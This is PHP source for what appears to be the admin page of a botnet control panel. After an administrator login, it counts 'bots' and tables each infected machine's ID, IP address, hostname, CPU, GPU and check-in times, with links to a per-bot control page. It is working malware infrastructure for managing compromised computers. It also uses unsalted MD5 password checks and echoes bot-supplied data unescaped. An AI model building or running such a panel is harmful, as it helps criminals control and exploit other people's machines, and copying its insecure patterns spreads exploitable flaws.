<?php
 require_once('assets/config.php');
 $query = $mysqli->query("SELECT * FROM administrators WHERE id=1");
 $result = $query->fetch_assoc();
 session_start();
 ini_set('session.bug_compat_warn', 0);
 ini_set('session.bug_compat_42', 0);
 if( ($result['login'] == "") and ($result['pass'] == "") ) { header("Location: settings.php"); 
 } elseif (isset($_POST['submit'])) {
    	if(($_POST['login'] == $result['login']) and (md5($_POST['pass']) == $result['pass'])) {
    		  $_SESSION['login'] = $result['login'];
      		$_SESSION['pass'] = $result['pass'];
    	} else { header("Location: index.php?i=edata"); exit; }
  	} elseif( ($_SESSION['login'] == $result['login']) and ($_SESSION['pass'] == $result['pass']) ) {
      if(isset($_POST['onpageinput'])) { $onpage = $_POST['onpageinput']; } else { $onpage = 5; }
  } else { header("Location: index.php?i=eauth"); exit; }
?>
<html>
 <head>
  <title>- Feed -</title>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="assets/css/style.css" media="screen" type="text/css" />
  <link rel="stylesheet" href="assets/css/table.css" media="screen" type="text/css" />
 </head>
 <body>
  <nav class="header">
   <p class="text-tag"><?php echo $result['login']; ?>
    <input class="header-button" style="margin-left: 15px;" type="button" value="Users" onClick='location.href="admin.php"'>
    <input class="header-button" type="button" value="Settings" onClick='location.href="settings.php"'>
    <input class="header-logout" type="button" value="Logout" onClick='location.href="logout.php"'>
   </p>
  </nav>
  <div class="block-status">
   <form style="display: inline;" method="post" action="admin.php">
    <?php 
      $query = $mysqli->query("SELECT COUNT(1) FROM bots");
      $b = $query->fetch_array();
      echo "Total bots: ".$b[0];
    ?>
    <button class="on-page-button" onclick='showonpage()'>Show</button>&nbsp;
    <input class="on-page-slider" name='onpageinput' type='number' id='onpageinput' value=5>
   </form>
  </div>
  <table class='table-menu'>    
   <tr><th>Tag</th><th>Machine ID</th><th>IP-Address</th><th>Machine Name</th><th>Processor</th><th>Videocard</th><th>First Response</th><th>Last Response</th></tr>
    <?php
     if($b[0] > $onpage) {
      $i = 0;
      $afind = 0;
      while ($afind < $onpage) {
        $query = $mysqli->query("SELECT * FROM bots WHERE id='$i'");
        $result = $query->fetch_assoc();
        $i++;
        if( ($result['uid'] != null) and ($result['cpu'] != null) ) {
          echo "<tr>"; 
          $userid = $result['uid'];
          echo "<td>".$result['tag']."</td>";
          echo "<td><p class=\"text-control\" onClick='location.href=\"control.php?i=$userid\"' title=\"Bot Control Panel\">".$result['uid']."</p></td>";
          echo "<td>".$result['ip']."</td>";
          echo "<td>".$result['mhn']."</td>";
          echo "<td>".$result['cpu']."</td>";
          echo "<td>".$result['gpu']."</td>";
          echo "<td>".$result['fresponse']."</td>";
          echo "<td>".$result['lresponse']."</td>";
          echo "</tr>";
          $afind++;
        }
      }
     } else { 
       $i = 0;
       $afind = 0;
       while ($afind < $b[0]) {
        $query = $mysqli->query("SELECT * FROM bots WHERE id='$i'");
        $result = $query->fetch_assoc();
        $i++;
        if( ($result['uid'] != null) and ($result['cpu'] != null) ) {
          echo "<tr>";
          $userid = $result['uid'];
          echo "<td>".$result['tag']."</td>";
          echo "<td><p class=\"text-control\" onClick='location.href=\"control.php?i=$userid\"'  title=\"Bot Control Panel\">".$result['uid']."</p></td>";
          echo "<td>".$result['ip']."</td>";
          echo "<td>".$result['mhn']."</td>";
          echo "<td>".$result['cpu']."</td>";
          echo "<td>".$result['gpu']."</td>";
          echo "<td>".$result['fresponse']."</td>";
          echo "<td>".$result['lresponse']."</td>"; 
          echo "</tr>";
          $afind++;
        }
      }
     }
    ?>
  </table>

 </body>
</html>